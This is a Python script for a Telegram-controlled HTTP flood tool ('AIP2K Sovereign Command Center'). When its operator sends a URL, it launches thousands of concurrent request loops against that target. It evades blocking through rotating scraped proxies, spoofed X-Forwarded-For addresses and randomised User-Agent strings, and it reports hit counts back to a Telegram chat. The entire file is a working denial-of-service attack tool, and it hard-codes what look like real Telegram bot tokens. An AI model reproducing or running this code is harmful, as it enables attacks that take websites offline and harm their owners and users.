import asyncio
import aiohttp
import random
from aiohttp import web

# [AIP2K SOVEREIGN COMMAND CENTER - DEFINITIVE VERSION 2.0]
MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE", "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI", "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo", "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}
MASTER_ID = 1938591484

class AIP2K_Supreme_Core:
    def __init__(self):
        self.session = None
        self.targets = {}
        self.proxies = []
        self.soldier_active = {name: True for name in SLAVE_ARMY}
        self.stats = {name: {"hits": 0, "errs": 0} for name in SLAVE_ARMY}
        self.total_global_hits = 0
        self.report_interval = 1000 
        self.attack_delay = 0.000001
        self.headers_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) Safari/605.1.15"
        ]

    async def _notify(self, text):
        url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
        try:
            async with self.session.post(url, json={'chat_id': MASTER_ID, 'text': text, 'parse_mode': 'Markdown'}) as r:
                return await r.json()
        except: pass

    async def _fetch_proxies(self):
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
        ]
        while True:
            temp = []
            for u in urls:
                try:
                    async with self.session.get(u, timeout=10) as r:
                        if r.status == 200: temp.extend((await r.text()).splitlines())
                except: pass
            if temp: self.proxies = list(set(temp))
            await asyncio.sleep(300)

    async def _strike_engine(self, name, target):
        while target in self.targets and self.soldier_active[name]:
            proxy = random.choice(self.proxies) if self.proxies else None
            h = {
                'User-Agent': random.choice(self.headers_pool),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Referer': 'https://www.google.com/',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            try:
                async with self.session.get(target, headers=h, proxy=f"http://{proxy}" if proxy else None, timeout=5) as r:
                    if r.status == 200:
                        self.stats[name]["hits"] += 1
                        self.total_global_hits += 1
                        if self.total_global_hits % self.report_interval == 0:
                            asyncio.create_task(self._send_dashboard())
                    else: self.stats[name]["errs"] += 1
            except: self.stats[name]["errs"] += 1
            await asyncio.sleep(self.attack_delay)

    async def _send_dashboard(self):
        msg = f"🛰 **AIP2K SUPREME MONITOR**\n🎯 **Total Success:** `{self.total_global_hits}`\n"
        msg += "--------------------------\n"
        for n, d in self.stats.items():
            st = "⚡" if self.soldier_active[n] else "💤"
            msg += f"{st} {n}: ✅ `{d['hits']}` | ❌ `{d['errs']}`\n"
        await self._notify(msg)

    async def handle_updates(self):
        offset = 0
        await self._notify("🔱 **AIP2K SYSTEM ONLINE**\nCommand structure locked.")
        asyncio.create_task(self._fetch_proxies())
        while True:
            try:
                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}&timeout=30"
                async with self.session.get(url) as r:
                    data = await r.json()
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})
                        cmd = msg.get('text', '').lower()
                        if msg.get('from', {}).get('id') != MASTER_ID: continue
                        
                        if cmd.startswith("http"):
                            self.targets[cmd] = True
                            await self._notify(f"⚔️ **WAR STARTED**\nTarget: {cmd}")
                            for n in SLAVE_ARMY:
                                self.soldier_active[n] = True
                                for _ in range(350): asyncio.create_task(self._strike_engine(n, cmd))
                        
                        elif cmd == "/stop_all":
                            self.targets.clear()
                            for n in SLAVE_ARMY: self.soldier_active[n] = False
                            await self._notify("🛑 **ALL SOLDIERS HALTED.**")

                        elif cmd.startswith("/rest "):
                            name = cmd.split()[1].upper()
                            if name in self.soldier_active:
                                self.soldier_active[name] = False
                                await self._notify(f"💤 {name} is now resting.")

                        elif cmd.startswith("/wake "):
                            name = cmd.split()[1].upper()
                            if name in self.soldier_active:
                                self.soldier_active[name] = True
                                if self.targets:
                                    t = list(self.targets.keys())[0]
                                    for _ in range(350): asyncio.create_task(self._strike_engine(name, t))
                                await self._notify(f"🔥 {name} is back in action!")

                        elif cmd == "/status":
                            await self._send_dashboard()
            except: await asyncio.sleep(1)

async def main():
    bot = AIP2K_Supreme_Core()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as sess:
        bot.session = sess
        app = web.Application(); runner = web.AppRunner(app)
        await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await bot.handle_updates()

if __name__ == "__main__":
    asyncio.run(main())
    
